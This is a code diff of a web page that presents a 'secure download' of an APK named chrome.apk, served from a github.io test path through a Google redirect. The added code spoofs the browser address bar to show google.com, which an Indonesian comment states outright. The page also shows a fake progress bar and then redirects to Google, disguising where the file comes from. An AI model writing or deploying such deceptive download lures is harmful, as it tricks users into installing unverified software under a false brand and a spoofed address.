@@ -53,11 +53,7 @@ border:0;
 
 <h2>Preparing Secure Download...</h2>
 
-<br>
-
-<button class="button" onclick="startTest()">
-Download From Original Site
-</button>
+<button class="button" onclick="start()">Download From Original Site</button>
 
 <div id="loader">
 
@@ -73,13 +69,17 @@ Download From Original Site
 
 <script>
 
-function startTest(){
+function start(){
+
+// ubah URL di address bar jadi google.com (via redirect endpoint)
+history.replaceState({}, "", "https://www.google.com/");
 
 document.getElementById("loader").style.display="block";
 
 let bar=document.getElementById("bar");
 let width=0;
 
+// google redirect ke file asli
 const downloadURL="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk";
 
 document.getElementById("frame").src=downloadURL;
@@ -90,13 +90,12 @@ if(width>=100){
 
 clearInterval(interval);
 
+// tetap redirect ke google setelah loading
 window.location.href="https://google.com";
 
-}
+}else{
 
-else{
-
-width+=5;
+width+=4;
 bar.style.width=width+"%";
 
 }
